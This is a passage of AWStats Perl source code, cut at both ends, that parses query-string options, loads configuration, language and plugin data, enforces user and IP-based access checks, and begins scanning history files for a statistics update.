{\n\t\t$FilterIn{'refererpages'} = \"$1\";\n\t} # Filter on referer list can also be defined with refererpagesfilter=filter\n\tif ( $QueryString =~ /refererpagesfilterex=([^&]+)/i ) {\n\t\t$FilterEx{'refererpages'} = \"$1\";\n\t}    #\n\t     # All output\n\tif ( $QueryString =~ /output=allhosts:([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t} # Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=lasthosts:([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t} # Filter on host list can be defined with output=lasthosts:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=urldetail:([^&]+)/i ) {\n\t\t$FilterIn{'url'} = \"$1\";\n\t} # Filter on URL list can be defined with output=urldetail:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=refererpages:([^&]+)/i ) {\n\t\t$FilterIn{'refererpages'} = \"$1\";\n\t} # Filter on referer list can be defined with output=refererpages:filter to reduce number of lines read and showed\n\t  # Config parameters\n\tif ( $QueryString =~ /LogFile=([^&]+)/i ) { $LogFile = \"$1\"; }\n\n\t# If show options\n\tif ( $QueryString =~ /showsteps/i ) {\n\t\t$ShowSteps = 1;\n\t\t$QueryString =~ s/showsteps[^&]*//i;\n\t}\n\tif ( $QueryString =~ /showcorrupted/i ) {\n\t\t$ShowCorrupted = 1;\n\t\t$QueryString =~ s/showcorrupted[^&]*//i;\n\t}\n\tif ( $QueryString =~ /showdropped/i ) {\n\t\t$ShowDropped = 1;\n\t\t$QueryString =~ s/showdropped[^&]*//i;\n\t}\n\tif ( $QueryString =~ /showunknownorigin/i ) {\n\t\t$ShowUnknownOrigin = 1;\n\t\t$QueryString =~ s/showunknownorigin[^&]*//i;\n\t}\n\tif ( $QueryString =~ /showdirectorigin/i ) {\n\t\t$ShowDirectOrigin = 1;\n\t\t$QueryString =~ s/showdirectorigin[^&]*//i;\n\t}\n\t\n\t$SiteConfig =~ s/\\.\\.//g; \n}\nif ( $QueryString =~ /(^|&|&amp;)staticlinks/i ) {\n\t$StaticLinks = \"$PROG.$SiteConfig\";\n}\nif ( $QueryString =~ /(^|&|&amp;)staticlinks=([^&]+)/i ) {\n\t$StaticLinks = \"$2\";\n}    # When ran from awstatsbuildstaticpages.pl\nif ( $QueryString =~ /(^|&|&amp;)staticlinksext=([^&]+)/i ) {\n\t$StaticExt = \"$2\";\n}\nif ( $QueryString =~ /(^|&|&amp;)framename=([^&]+)/i ) { $FrameName = \"$2\"; }\nif ( $QueryString =~ /(^|&|&amp;)debug=(\\d+)/i )       { $Debug     = $2; }\nif ( $QueryString =~ /(^|&|&amp;)databasebreak=(\\w+)/i ) {\n\t$DatabaseBreak = $2;\n}\nif ( $QueryString =~ /(^|&|&amp;)updatefor=(\\d+)/i ) { $UpdateFor = $2; }\n\nif ( $QueryString =~ /(^|&|&amp;)noloadplugin=([^&]+)/i ) {\n\tforeach ( split( /,/, $2 ) ) { $NoLoadPlugin{ &Sanitize( \"$_\", 1 ) } = 1; }\n}\nif ( $QueryString =~ /(^|&|&amp;)limitflush=(\\d+)/i ) { $LIMITFLUSH = $2; }\nif ( $QueryString =~ /(^|&|&amp;)nboflastupdatelookuptosave=(\\d+)/i ) { $NBOFLASTUPDATELOOKUPTOSAVE = $2; }\n\n# Get/Define output\nif ( $QueryString =~\n\t/(^|&|&amp;)output(=[^&]*|)(.*)(&|&amp;)output(=[^&]*|)(&|$)/i )\n{\n\terror( \"Only 1 output option is allowed\", \"\", \"\", 1 );\n}\nif ( $QueryString =~ /(^|&|&amp;)output(=[^&]*|)(&|$)/i ) {\n\n\t# At least one output expected. We define %HTMLOutput\n\tmy $outputlist = \"$2\";\n\tif ($outputlist) {\n\t\t$outputlist =~ s/^=//;\n\t\tforeach my $outputparam ( split( /,/, $outputlist ) ) {\n\t\t\t$outputparam =~ s/:(.*)$//;\n\t\t\tif ($outputparam) { $HTMLOutput{ lc($outputparam) } = \"$1\" || 1; }\n\t\t}\n\t}\n\n\t# If on command line and no update\n\tif ( !$ENV{'GATEWAY_INTERFACE'} && $QueryString !~ /update/i ) {\n\t\t$UpdateStats = 0;\n\t}\n\n\t# If no output defined, used default value\n\tif ( !scalar keys %HTMLOutput ) { $HTMLOutput{'main'} = 1; }\n}\nif ( $ENV{'GATEWAY_INTERFACE'} && !scalar keys %HTMLOutput ) {\n\t$HTMLOutput{'main'} = 1;\n}\n\n# Remove -output option with no = from QueryString\n$QueryString =~ s/(^|&|&amp;)output(&|$)/$1$2/i;\n$QueryString =~ s/&+$//;\n\n# Check year, month, day, hour parameters\nif ( $QueryString =~ /(^|&|&amp;)month=(year)/i ) {\n\terror(\"month=year is a deprecated option. Use month=all instead.\");\n}\nif ( $QueryString =~ /(^|&|&amp;)year=(\\d\\d\\d\\d)/i ) {\n\t$YearRequired = sprintf( \"%04d\", $2 );\n}\nelse { $YearRequired = \"$nowyear\"; }\nif ( $QueryString =~ /(^|&|&amp;)month=(\\d{1,2})/i ) {\n\t$MonthRequired = sprintf( \"%02d\", $2 );\n}\nelsif ( $QueryString =~ /(^|&|&amp;)month=(all)/i ) { $MonthRequired = 'all'; }\nelse { $MonthRequired = \"$nowmonth\"; }\nif ( $QueryString =~ /(^|&|&amp;)day=(\\d{1,2})/i ) {\n\t$DayRequired = sprintf( \"%02d\", $2 );\n} # day is a hidden option. Must not be used (Make results not understandable). Available for users that rename history files with day.\nelse { $DayRequired = ''; }\nif ( $QueryString =~ /(^|&|&amp;)hour=(\\d{1,2})/i ) {\n\t$HourRequired = sprintf( \"%02d\", $2 );\n} # hour is a hidden option. Must not be used (Make results not understandable). Available for users that rename history files with day.\nelse { $HourRequired = ''; }\n\n# Check parameter validity\n# TODO\n\n# Print AWStats and Perl version\nif ($Debug) {\n\tdebug( ucfirst($PROG) . \" - $VERSION - Perl $^X $]\", 1 );\n\tdebug( \"DIR=$DIR PROG=$PROG Extension=$Extension\",   2 );\n\tdebug( \"QUERY_STRING=$QueryString\",                  2 );\n\tdebug( \"HTMLOutput=\" . join( ',', keys %HTMLOutput ), 1 );\n\tdebug( \"YearRequired=$YearRequired, MonthRequired=$MonthRequired\", 2 );\n\tdebug( \"DayRequired=$DayRequired, HourRequired=$HourRequired\",     2 );\n\tdebug( \"UpdateFor=$UpdateFor\",                                     2 );\n\tdebug( \"PluginMode=$PluginMode\",                                   2 );\n\tdebug( \"DirConfig=$DirConfig\",                                     2 );\n}\n\n# Force SiteConfig if AWSTATS_FORCE_CONFIG is defined\nif ( $ENV{'AWSTATS_CONFIG'} ) {\n\t$ENV{'AWSTATS_FORCE_CONFIG'} = $ENV{'AWSTATS_CONFIG'};\n}    # For backward compatibility\nif ( $ENV{'AWSTATS_FORCE_CONFIG'} ) {\n\tif ($Debug) {\n\t\tdebug(  \"AWSTATS_FORCE_CONFIG parameter is defined to '\"\n\t\t\t  . $ENV{'AWSTATS_FORCE_CONFIG'}\n\t\t\t  . \"'. $PROG will use this as config value.\" );\n\t}\n\t$SiteConfig = &Sanitize( $ENV{'AWSTATS_FORCE_CONFIG'} );\n}\n\n# Display version information\nif ( $QueryString =~ /(^|&|&amp;)version/i ) {\n\tprint \"$PROG $VERSION\\n\";\n\texit 0;\n}\n# Display help information\nif ( ( !$ENV{'GATEWAY_INTERFACE'} ) && ( !$SiteConfig ) ) {\n\t&PrintCLIHelp();\n\texit 2;\n}\n$SiteConfig ||= &Sanitize( $ENV{'SERVER_NAME'} );\n\n#$ENV{'SERVER_NAME'}||=$SiteConfig;\t# For thoose who use __SERVER_NAME__ in conf file and use CLI.\n$ENV{'AWSTATS_CURRENT_CONFIG'} = $SiteConfig;\n\n# Read config file (SiteConfig must be defined)\n&Read_Config($DirConfig);\n\n# Check language\nif ( $QueryString =~ /(^|&|&amp;)lang=([^&]+)/i ) { $Lang = \"$2\"; }\nif ( !$Lang || $Lang eq 'auto' ) {    # If lang not defined or forced to auto\n\tmy $langlist = $ENV{'HTTP_ACCEPT_LANGUAGE'} || '';\n\t$langlist =~ s/;[^,]*//g;\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"Search an available language among HTTP_ACCEPT_LANGUAGE=$langlist\",\n\t\t\t1\n\t\t);\n\t}\n\tforeach my $code ( split( /,/, $langlist ) )\n\t{                                 # Search for a valid lang in priority\n\t\tif ( $LangBrowserToLangAwstats{$code} ) {\n\t\t\t$Lang = $LangBrowserToLangAwstats{$code};\n\t\t\tif ($Debug) { debug( \" Will try to use Lang=$Lang\", 1 ); }\n\t\t\tlast;\n\t\t}\n\t\t$code =~ s/-.*$//;\n\t\tif ( $LangBrowserToLangAwstats{$code} ) {\n\t\t\t$Lang = $LangBrowserToLangAwstats{$code};\n\t\t\tif ($Debug) { debug( \" Will try to use Lang=$Lang\", 1 ); }\n\t\t\tlast;\n\t\t}\n\t}\n}\nif ( !$Lang || $Lang eq 'auto' ) {\n\tif ($Debug) {\n\t\tdebug( \" No language defined or available. Will use Lang=en\", 1 );\n\t}\n\t$Lang = 'en';\n}\n\n# Check and correct bad parameters\n&Check_Config();\n\n# Now SiteDomain is defined\n\nif ( $Debug && !$DebugMessages ) {\n\terror(\n\"Debug has not been allowed. Change DebugMessages parameter in config file to allow debug.\"\n\t);\n}\n\n# Define frame name and correct variable for frames\nif ( !$FrameName ) {\n\tif (   $ENV{'GATEWAY_INTERFACE'}\n\t\t&& $UseFramesWhenCGI\n\t\t&& $HTMLOutput{'main'}\n\t\t&& !$PluginMode )\n\t{\n\t\t$FrameName = 'index';\n\t}\n\telse { $FrameName = 'main'; }\n}\n\n# Load Message files, Reference data files and Plugins\nif ($Debug) { debug( \"FrameName=$FrameName\", 1 ); }\nif ( $FrameName ne 'index' ) {\n\t&Read_Language_Data($Lang);\n\tif ( $FrameName ne 'mainleft' ) {\n\t\tmy %datatoload = ();\n\t\tmy (\n\t\t\t$filedomains, $filemime, $filerobots, $fileworms,\n\t\t\t$filebrowser, $fileos,   $filese\n\t\t  )\n\t\t  = (\n\t\t\t'domains',  'mime',\n\t\t\t'robots',   'worms',\n\t\t\t'browsers', 'operating_systems',\n\t\t\t'search_engines'\n\t\t  );\n\t\tmy ( $filestatushttp, $filestatussmtp ) =\n\t\t  ( 'status_http', 'status_smtp' );\n\t\tif ( $LevelForBrowsersDetection eq 'allphones' ) {\n\t\t\t$filebrowser = 'browsers_phone';\n\t\t}\n\t\tif ($UpdateStats) {    # If update\n\t\t\tif ($LevelForFileTypesDetection) {\n\t\t\t\t$datatoload{$filemime} = 1;\n\t\t\t}                  # Only if need to filter on known extensions\n\t\t\tif ($LevelForRobotsDetection) {\n\t\t\t\t$datatoload{$filerobots} = 1;\n\t\t\t}                  # ua\n\t\t\tif ($LevelForWormsDetection) {\n\t\t\t\t$datatoload{$fileworms} = 1;\n\t\t\t}                  # url\n\t\t\tif ($LevelForBrowsersDetection) {\n\t\t\t\t$datatoload{$filebrowser} = 1;\n\t\t\t}                  # ua\n\t\t\tif ($LevelForOSDetection) {\n\t\t\t\t$datatoload{$fileos} = 1;\n\t\t\t}                  # ua\n\t\t\tif ($LevelForRefererAnalyze) {\n\t\t\t\t$datatoload{$filese} = 1;\n\t\t\t}                  # referer\n\t\t\t                   # if (...) { $datatoload{'referer_spam'}=1; }\n\t\t}\n\t\tif ( scalar keys %HTMLOutput ) {    # If output\n\t\t\tif ( $ShowDomainsStats || $ShowHostsStats ) {\n\t\t\t\t$datatoload{$filedomains} = 1;\n\t\t\t} # TODO Replace by test if ($ShowDomainsStats) when plugins geoip can force load of domains datafile.\n\t\t\tif ($ShowFileTypesStats)  { $datatoload{$filemime}       = 1; }\n\t\t\tif ($ShowRobotsStats)     { $datatoload{$filerobots}     = 1; }\n\t\t\tif ($ShowWormsStats)      { $datatoload{$fileworms}      = 1; }\n\t\t\tif ($ShowBrowsersStats)   { $datatoload{$filebrowser}    = 1; }\n\t\t\tif ($ShowOSStats)         { $datatoload{$fileos}         = 1; }\n\t\t\tif ($ShowOriginStats)     { $datatoload{$filese}         = 1; }\n\t\t\tif ($ShowHTTPErrorsStats) { $datatoload{$filestatushttp} = 1; }\n\t\t\tif ($ShowSMTPErrorsStats) { $datatoload{$filestatussmtp} = 1; }\n\t\t}\n\t\t&Read_Ref_Data( keys %datatoload );\n\t}\n\t&Read_Plugins();\n}\n\n# Here charset is defined, so we can send the http header (Need BuildReportFormat,PageCode)\nif ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {\n\thttp_head();\n}    # Run from a browser as CGI\n\n# Init other parameters\n$NBOFLINESFORBENCHMARK--;\nif ( $ENV{'GATEWAY_INTERFACE'} ) { $DirCgi = ''; }\nif ( $DirCgi && !( $DirCgi =~ /\\/$/ ) && !( $DirCgi =~ /\\\\$/ ) ) {\n\t$DirCgi .= '/';\n}\nif ( !$DirData || $DirData =~ /^\\./ ) {\n\tif ( !$DirData || $DirData eq '.' ) {\n\t\t$DirData = \"$DIR\";\n\t}    # If not defined or chosen to '.' value then DirData is current dir\n\telsif ( $DIR && $DIR ne '.' ) { $DirData = \"$DIR/$DirData\"; }\n}\n$DirData ||= '.';    # If current dir not defined then we put it to '.'\n$DirData =~ s/[\\\\\\/]+$//;\n\nif ( $FirstDayOfWeek == 1 ) { @DOWIndex = ( 1, 2, 3, 4, 5, 6, 0 ); }\nelse { @DOWIndex = ( 0, 1, 2, 3, 4, 5, 6 ); }\n\n# Should we link to ourselves or to a wrapper script\n$AWScript = ( $WrapperScript ? \"$WrapperScript\" : \"$DirCgi$PROG.$Extension\" );\nif (index($AWScript,'?')>-1) \n{\n    $AWScript .= '&amp;';   # $AWScript contains URL parameters\n}\nelse \n{\n    $AWScript .= '?';\n}\n\n\n# Print html header (Need HTMLOutput,Expires,Lang,StyleSheet,HTMLHeadSectionExpires defined by Read_Config, PageCode defined by Read_Language_Data)\nif ( !$HeaderHTMLSent ) { &html_head; }\n\n# AWStats output is replaced by a plugin output\nif ($PluginMode) {\n\n\t#\tmy $function=\"BuildFullHTMLOutput_$PluginMode()\";\n\t#\teval(\"$function\");\n\tmy $function = \"BuildFullHTMLOutput_$PluginMode\";\n\t&$function();\n\tif ( $? || $@ ) { error(\"$@\"); }\n\t&html_end(0);\n\texit 0;\n}\n\n# Security check\nif ( $AllowAccessFromWebToAuthenticatedUsersOnly && $ENV{'GATEWAY_INTERFACE'} )\n{\n\tif ($Debug) { debug( \"REMOTE_USER=\" . $ENV{\"REMOTE_USER\"} ); }\n\tif ( !$ENV{\"REMOTE_USER\"} ) {\n\t\terror(\n\"Access to statistics is only allowed from an authenticated session to authenticated users.\"\n\t\t);\n\t}\n\tif (@AllowAccessFromWebToFollowingAuthenticatedUsers) {\n\t\tmy $userisinlist = 0;\n\t\tmy $remoteuser   = quotemeta( $ENV{\"REMOTE_USER\"} );\n\t\t$remoteuser =~ s/\\s/%20/g\n\t\t  ; # Allow authenticated user with space in name to be compared to allowed user list\n\t\tmy $currentuser = qr/^$remoteuser$/i;    # Set precompiled regex\n\t\tforeach (@AllowAccessFromWebToFollowingAuthenticatedUsers) {\n\t\t\tif (/$currentuser/o) { $userisinlist = 1; last; }\n\t\t}\n\t\tif ( !$userisinlist ) {\n\t\t\terror(  \"User '\"\n\t\t\t\t  . $ENV{\"REMOTE_USER\"}\n\t\t\t\t  . \"' is not allowed to access statistics of this domain/config.\"\n\t\t\t);\n\t\t}\n\t}\n}\nif ( $AllowAccessFromWebToFollowingIPAddresses && $ENV{'GATEWAY_INTERFACE'} ) {\n\tmy $IPAddress     = $ENV{\"REMOTE_ADDR\"};                  # IPv4 or IPv6\n\tmy $useripaddress = &Convert_IP_To_Decimal($IPAddress);\n\tmy @allowaccessfromipaddresses =\n\t  split( /[\\s,]+/, $AllowAccessFromWebToFollowingIPAddresses );\n\tmy $allowaccess = 0;\n\tforeach my $ipaddressrange (@allowaccessfromipaddresses) {\n\t\tif ( $ipaddressrange !~\n\t\t\t/^(\\d+\\.\\d+\\.\\d+\\.\\d+)(?:-(\\d+\\.\\d+\\.\\d+\\.\\d+))*$/\n\t\t\t&& $ipaddressrange !~\n\t\t\t/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\\/\\d)/ )\n\t\t{\n\t\t\terror(\n\"AllowAccessFromWebToFollowingIPAddresses is defined to '$AllowAccessFromWebToFollowingIPAddresses' but part of value does not match the correct syntax: IPv4AddressMin[-IPv4AddressMax] or IPv6Address[\\/prefix] in \\\"$ipaddressrange\\\"\"\n\t\t\t);\n\t\t}\n\n\t\t# Test ip v4\n\t\tif ( $ipaddressrange =~\n\t\t\t/^(\\d+\\.\\d+\\.\\d+\\.\\d+)(?:-(\\d+\\.\\d+\\.\\d+\\.\\d+))*$/ )\n\t\t{\n\t\t\tmy $ipmin = &Convert_IP_To_Decimal($1);\n\t\t\tmy $ipmax = $2 ? &Convert_IP_To_Decimal($2) : $ipmin;\n\n\t\t\t# Is it an authorized ip ?\n\t\t\tif ( ( $useripaddress >= $ipmin ) && ( $useripaddress <= $ipmax ) )\n\t\t\t{\n\t\t\t\t$allowaccess = 1;\n\t\t\t\tlast;\n\t\t\t}\n\t\t}\n\n\t\t# Test ip v6\n\t\tif ( $ipaddressrange =~\n\t\t\t/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\\/\\d)/ )\n\t\t{\n\t\t\tif ( $ipaddressrange =~ /::\\// ) {\n\t\t\t\tmy @IPv6split = split( /::/, $ipaddressrange );\n\t\t\t\tif ( $IPAddress =~ /^$IPv6split[0]/ ) {\n\t\t\t\t\t$allowaccess = 1;\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t}\n\t\t\telsif ( $ipaddressrange == $IPAddress ) {\n\t\t\t\t$allowaccess = 1;\n\t\t\t\tlast;\n\t\t\t}\n\t\t}\n\t}\n\tif ( !$allowaccess ) {\n\t\terror( \"Access to statistics is not allowed from your IP Address \"\n\t\t\t  . $ENV{\"REMOTE_ADDR\"} );\n\t}\n}\nif (   ( $UpdateStats || $MigrateStats )\n\t&& ( !$AllowToUpdateStatsFromBrowser )\n\t&& $ENV{'GATEWAY_INTERFACE'} )\n{\n\terror(  \"\"\n\t\t  . ( $UpdateStats ? \"Update\" : \"Migrate\" )\n\t\t  . \" of statistics has not been allowed from a browser (AllowToUpdateStatsFromBrowser should be set to 1).\"\n\t);\n}\nif ( scalar keys %HTMLOutput && $MonthRequired eq 'all' ) {\n\tif ( !$AllowFullYearView ) {\n\t\terror(\n\"Full year view has not been allowed (AllowFullYearView is set to 0).\"\n\t\t);\n\t}\n\tif ( $AllowFullYearView < 3 && $ENV{'GATEWAY_INTERFACE'} ) {\n\t\terror(\n\"Full year view has not been allowed from a browser (AllowFullYearView should be set to 3).\"\n\t\t);\n\t}\n}\n\n#------------------------------------------\n# MIGRATE PROCESS (Must be after reading config cause we need MaxNbOf... and Min...)\n#------------------------------------------\nif ($MigrateStats) {\n\tif ($Debug) { debug( \"MigrateStats is $MigrateStats\", 2 ); }\n\tif ( $MigrateStats !~\n\t\t/^(.*)$PROG(\\d\\d)(\\d\\d\\d\\d)(\\d{0,2})(\\d{0,2})(.*)\\.txt$/ )\n\t{\n\t\terror(\n\"AWStats history file name must match following syntax: ${PROG}MMYYYY[.config].txt\",\n\t\t\t\"\", \"\", 1\n\t\t);\n\t}\n\t$DirData       = \"$1\";\n\t$MonthRequired = \"$2\";\n\t$YearRequired  = \"$3\";\n\t$DayRequired   = \"$4\";\n\t$HourRequired  = \"$5\";\n\t$FileSuffix    = \"$6\";\n\n\t# Correct DirData\n\tif ( !$DirData || $DirData =~ /^\\./ ) {\n\t\tif ( !$DirData || $DirData eq '.' ) {\n\t\t\t$DirData = \"$DIR\";\n\t\t}    # If not defined or chosen to '.' value then DirData is current dir\n\t\telsif ( $DIR && $DIR ne '.' ) { $DirData = \"$DIR/$DirData\"; }\n\t}\n\t$DirData ||= '.';    # If current dir not defined then we put it to '.'\n\t$DirData =~ s/[\\\\\\/]+$//;\n\tprint \"Start migration for file '$MigrateStats'.\";\n\tprint $ENV{'GATEWAY_INTERFACE'} ? \"<br />\\n\" : \"\\n\";\n\tif ($EnableLockForUpdate) { &Lock_Update(1); }\n\tmy $newhistory =\n\t  &Read_History_With_TmpUpdate( $YearRequired, $MonthRequired, $DayRequired,\n\t\t$HourRequired, 1, 0, 'all' );\n\tif ( rename( \"$newhistory\", \"$MigrateStats\" ) == 0 ) {\n\t\tunlink \"$newhistory\";\n\t\terror(\n\"Failed to rename \\\"$newhistory\\\" into \\\"$MigrateStats\\\".\\nWrite permissions on \\\"$MigrateStats\\\" might be wrong\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'} ? \" for a 'migration from web'\" : \"\"\n\t\t\t  )\n\t\t\t  . \" or file might be opened.\"\n\t\t);\n\t}\n\tif ($EnableLockForUpdate) { &Lock_Update(0); }\n\tprint \"Migration for file '$MigrateStats' successful.\";\n\tprint $ENV{'GATEWAY_INTERFACE'} ? \"<br />\\n\" : \"\\n\";\n\t&html_end(1);\n\texit 0;\n}\n\n# Output main frame page and exit. This must be after the security check.\nif ( $FrameName eq 'index' ) {\n\n\t# Define the NewLinkParams for main chart\n\tmy $NewLinkParams = ${QueryString};\n\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\n\t# Exit if main frame\n\tprint \"<frameset cols=\\\"$FRAMEWIDTH,*\\\">\\n\";\n\tprint \"<frame name=\\\"mainleft\\\" src=\\\"\"\n\t  . XMLEncode(\"$AWScript${NewLinkParams}framename=mainleft\")\n\t  . \"\\\" noresize=\\\"noresize\\\" frameborder=\\\"0\\\" />\\n\";\n\tprint \"<frame name=\\\"mainright\\\" src=\\\"\"\n\t  . XMLEncode(\"$AWScript${NewLinkParams}framename=mainright\")\n\t  . \"\\\" noresize=\\\"noresize\\\" scrolling=\\\"yes\\\" frameborder=\\\"0\\\" />\\n\";\n\tprint \"<noframes><body>\";\n\tprint \"Your browser does not support frames.<br />\\n\";\n\tprint \"You must set AWStats UseFramesWhenCGI parameter to 0\\n\";\n\tprint \"to see your reports.<br />\\n\";\n\tprint \"</body></noframes>\\n\";\n\tprint \"</frameset>\\n\";\n\t&html_end(0);\n\texit 0;\n}\n\n%MonthNumLib = (\n\t\"01\", \"$Message[60]\", \"02\", \"$Message[61]\", \"03\", \"$Message[62]\",\n\t\"04\", \"$Message[63]\", \"05\", \"$Message[64]\", \"06\", \"$Message[65]\",\n\t\"07\", \"$Message[66]\", \"08\", \"$Message[67]\", \"09\", \"$Message[68]\",\n\t\"10\", \"$Message[69]\", \"11\", \"$Message[70]\", \"12\", \"$Message[71]\"\n);\n\n# Build ListOfYears list with all existing years\n(\n\t$lastyearbeforeupdate, $lastmonthbeforeupdate, $lastdaybeforeupdate,\n\t$lasthourbeforeupdate, $lastdatebeforeupdate\n  )\n  = ( 0, 0, 0, 0, 0 );\nmy $datemask = '';\nif    ( $DatabaseBreak eq 'month' ) { $datemask = '(\\d\\d)(\\d\\d\\d\\d)'; }\nelsif ( $DatabaseBreak eq 'year' )  { $datemask = '(\\d\\d\\d\\d)'; }\nelsif ( $DatabaseBreak eq 'day' )   { $datemask = '(\\d\\d)(\\d\\d\\d\\d)(\\d\\d)'; }\nelsif ( $DatabaseBreak eq 'hour' )  {\n\t$datemask = '(\\d\\d)(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)';\n}\n\nif ($Debug) {\n\tdebug(\n\"Scan for last history files into DirData='$DirData' with mask='$datemask'\"\n\t);\n}\n\nmy $retval = opendir( DIR, \"$DirData\" );\nif(! $retval) \n{\n    error( \"Failed to open directory $DirData : $!\");\n}\nmy $regfilesuffix = quotemeta($FileSuffix);\nforeach ( grep /^$PROG$datemask$regfilesuffix\\.txt(|\\.gz)$/i,\n\tfile_filt sort readdir DIR )\n{\n\t/^$PROG$datemask$regfilesuffix\\.txt(|\\.gz)$/i;\n\tif ( !$ListOfYears{\"$2\"} || \"$1\" gt $ListOfYears{\"$2\"} ) {\n\n\t\t# ListOfYears contains max month found\n\t\t$ListOfYears{\"$2\"} = \"$1\";\n\t}\n\tmy $rangestring = ( $2 || \"\" ) . ( $1 || \"\" ) . ( $3 || \"\" ) . ( $4 || \"\" );\n\tif ( $rangestring gt $lastdatebeforeupdate ) {\n\n\t\t# We are on a new max for mask\n\t\t$lastyearbeforeupdate  = ( $2 || \"\" );\n\t\t$lastmonthbeforeupdate = ( $1 || \"\" );\n\t\t$lastdaybeforeupdate   = ( $3 || \"\" );\n\t\t$lasthourbeforeupdate  = ( $4 || \"\" );\n\t\t$lastdatebeforeupdate = $rangestring;\n\t}\n}\nclose DIR;\n\n# If at least one file found, get value for LastLine\nif ($lastyearbeforeupdate) {\n\n\t# Read 'general' section of last history file for LastLine\n\t&Read_History_With_TmpUpdate( $lastyearbeforeupdate, $lastmonthbeforeupdate,\n\t\t$lastdaybeforeupdate, $lasthourbeforeupdate, 0, 0, \"general\" );\n}\n\n# Warning if lastline in future\nif ( $LastLine > ( $nowtime + 20000 ) ) {\n\twarning(\n\"WARNING: LastLine parameter in history file is '$LastLine' so in future. May be you need to correct manually the line LastLine in some awstats*.$SiteConfig.conf files.\"\n\t);\n}\n\n# Force LastLine\nif ( $QueryString =~ /lastline=(\\d{14})/i ) {\n\t$LastLine = $1;\n}\nif ($Debug) {\n\tdebug(\"Last year=$lastyearbeforeupdate - Last month=$lastmonthbeforeupdate\");\n\tdebug(\"Last day=$lastdaybeforeupdate - Last hour=$lasthourbeforeupdate\");\n\tdebug(\"LastLine=$LastLine\");\n\tdebug(\"LastLineNumber=$LastLineNumber\");\n\tdebug(\"LastLineOffset=$LastLineOffset\");\n\tdebug(\"LastLineChecksum=$LastLineChecksum\");\n}\n\n# Init vars\n&Init_HashArray();\n\n#------------------------------------------\n# UPDATE PROCESS\n#------------------------------------------\nmy $lastlinenb         = 0;\nmy $lastlineoffset     = 0;\nmy $lastlineoffsetnext = 0;\nif ($Debug) { debug( \"UpdateStats is $UpdateStats\", 2 ); }\nif ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )\n{    # Update only on index page or when not framed to avoid update twice\n\n\tmy %MonthNum = (\n\t\t\"Jan\", \"01\", \"jan\", \"01\", \"Feb\", \"02\", \"feb\", \"02\", \"Mar\", \"03\",\n\t\t\"mar\", \"03\", \"Apr\", \"04\", \"apr\", \"04\", \"May\", \"05\", \"may\", \"05\",\n\t\t\"Jun\", \"06\", \"jun\", \"06\", \"Jul\", \"07\", \"jul\", \"07\", \"Aug\", \"08\",\n\t\t\"aug\", \"08\", \"Sep\", \"09\", \"sep\", \"09\", \"Oct\", \"10\", \"oct\", \"10\",\n\t\t\"Nov\", \"11\", \"nov\", \"11\", \"Dec\", \"12\", \"dec\", \"12\"\n\t  )\n\t  ; # MonthNum must be in english because used to translate log date in apache log files\n\n\tif ( !scalar keys %HTMLOutput ) {\n\t\tprint\n\"Create/Update database for config \\\"$FileConfig\\\" by AWStats version $VERSION\\n\";\n\t\tprint \"From data in log file \\\"$LogFile\\\"...\\n\";\n\t}\n\n\tmy $lastprocessedyear  = $lastyearbeforeupdate  || 0;\n\tmy $lastprocessedmonth = $lastmonthbeforeupdate || 0;\n\tmy $lastprocessedday   = $lastdaybeforeupdate   || 0;\n\tmy $lastprocessedhour  = $lasthourbeforeupdate  || 0;\n\tmy $lastprocesseddate  = '';\n\tif ( $DatabaseBreak eq 'month' ) {\n\t\t$lastprocesseddate =\n\t\t  sprintf( \"%04i%02i\", $lastprocessedyear, $lastprocessedmonth );\n\t}\n\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t$lastprocesseddate = sprintf( \"%04i%\", $lastprocessedyear );\n\t}\n\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t$lastprocesseddate = sprintf( \"%04i%02i%02i\",\n\t\t\t$lastprocessedyear, $lastprocessedmonth, $lastprocessedday );\n\t}\n\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t$lastprocesseddate = sprintf(\n\t\t\t\"%04i%02i%02i%02i\",\n\t\t\t$lastprocessedyear, $lastprocessedmonth,\n\t\t\t$lastprocessedday,  $lastprocessedhour\n\t\t);\n\t}\n\n\tmy @list;\n\n\t# Init RobotsSearchIDOrder required for update process\n\t@list = ();\n\tif ( $LevelForRobotsDetection >= 1 ) {\n\t\tforeach ( 1 .. $LevelForRobotsDetection ) { push @list, \"list$_\"; }\n\t\tpush @list, \"listgen\";    # Always added\n\t}\n\tforeach my $key (@list) {\n\t\tpush @RobotsSearchIDOrder, @{\"RobotsSearchIDOrder_$key\"};\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"Add \"\n\t\t\t\t  . @{\"RobotsSearchIDOrder_$key\"}\n\t\t\t\t  . \" elements from RobotsSearchIDOrder_$key into RobotsSearchIDOrder\",\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"RobotsSearchIDOrder has now \" . @RobotsSearchIDOrder . \" elements\",\n\t\t\t1\n\t\t);\n\t}\n\n\t# Init SearchEnginesIDOrder required for update process\n\t@list = ();\n\tif ( $LevelForSearchEnginesDetection >= 1 ) {\n\t\tforeach ( 1 .. $LevelForSearchEnginesDetection ) {\n\t\t\tpush @list, \"list$_\";\n\t\t}\n\t\tpush @list, \"listgen\";    # Always 